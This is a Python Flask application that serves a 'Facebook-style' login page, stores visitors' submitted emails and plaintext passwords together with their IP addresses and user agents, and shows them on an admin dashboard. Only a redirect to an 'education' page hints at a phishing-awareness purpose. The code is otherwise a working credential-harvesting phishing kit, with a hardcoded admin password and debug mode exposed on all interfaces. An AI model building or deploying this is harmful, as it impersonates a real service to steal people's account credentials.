from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import sqlite3
import datetime
import hashlib
import os
from functools import wraps

app = Flask(__name__)
app.secret_key = os.urandom(24)
DATABASE = os.getenv('DATABASE_PATH', 'phishing_data.db')

def init_db():
    """Initialize the database"""
    try:
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        
        # Create the submissions table if it doesn't exist
        c.execute('''CREATE TABLE IF NOT EXISTS submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT NOT NULL,
                  password TEXT NOT NULL,
                  ip_address TEXT,
                  user_agent TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        
        conn.commit()
        conn.close()
        print("Database initialized successfully")
    except sqlite3.Error as e:
        print(f"Database initialization error: {e}")
        raise

# Ensure the database is initialized when the app starts
with app.app_context():
    init_db()

# Admin credentials (change these in production)
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'securepassword123'

def init_db():
    """Initialize the database"""
    try:
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        
        # Create the submissions table if it doesn't exist
        c.execute('''CREATE TABLE IF NOT EXISTS submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT,
                  password TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        conn.commit()
        conn.close()

    except sqlite3.Error as e:
        print(f"Database initialization error: {e}")
        raise

def require_admin(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    """Main landing page - Business collaboration theme"""
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Facebook-style login page"""
    if request.method == 'POST':
        # Capture credentials
        username = request.form.get('email')
        password = request.form.get('pass')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        
        # Store in database
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        c.execute("INSERT INTO submissions (username, password, ip_address, user_agent) VALUES (?, ?, ?, ?)",
                  (username, password, ip_address, user_agent))
        conn.commit()
        conn.close()
        
        # Redirect to educational page
        return redirect(url_for('educational_page'))
    
    return render_template('login.html')

@app.route('/success')
def educational_page():
    """Educational page showing users they were phished"""
    return render_template('education.html')

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template('admin_login.html', error='Invalid credentials')
    
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
@require_admin
def admin_dashboard():
    """Admin dashboard to view results"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM submissions ORDER BY timestamp DESC")
    submissions = c.fetchall()
    conn.close()
    
    return render_template('admin.html', submissions=submissions)

@app.route('/admin/clear')
@require_admin
def clear_data():
    """Clear all submitted data"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("DELETE FROM submissions")
    conn.commit()
    conn.close()
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.pop('admin_logged_in', None)
    return redirect(url_for('index'))

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)